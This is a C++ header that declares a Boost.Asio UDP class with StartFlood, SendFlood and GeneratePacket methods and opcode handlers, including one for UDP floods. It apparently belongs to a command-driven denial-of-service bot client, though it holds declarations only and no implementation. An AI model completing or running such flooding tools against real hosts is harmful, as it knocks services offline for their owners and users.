#pragma once
#include <boost/asio.hpp>
#include <boost/bind.hpp>
#include <queue>
#include <iostream>
#include "opcode.h"
#include "packet.h"

using boost::asio::ip::udp;

struct Packets
{
    packet _packet;
    udp::endpoint _endpoint;
};

class udp_connection
{
    packet _packet;
    packet _floodPckt;
    uint8_t * pPacket;
    std::queue<Packets> _packets;
    std::vector<udp::endpoint> _endpoints;
	boost::asio::deadline_timer _delay, _expiry;
	uint16_t _delayTime, _expiryTime;
	udp::resolver _resolver;
    udp::socket _socket;
	void resolve_handler(const boost::system::error_code& error, udp::resolver::iterator list);
	void FinishFlood();
	void SendFlood();
	void GeneratePacket(uint16_t size);
    void SendPacket(packet& sPacket, size_t endpointId);
    void SendNextPacket();
    void AwaitPacket();
    void receive_handler(const boost::system::error_code& error, size_t bytes_transferred);
    void packet_handle(const boost::system::error_code& error, size_t bytes_transferred);
    void write_handler(const boost::system::error_code& error, size_t bytes_transferred);
	public:
		udp_connection(boost::asio::io_service& io_service);
		void Connect(std::string host, std::string port);
		void StartFlood(std::string address, std::string port, uint16_t delay, uint16_t time, uint16_t size);
        void HandleOpcodeNull();
        void HandleOpcodeUdpFlood();
};
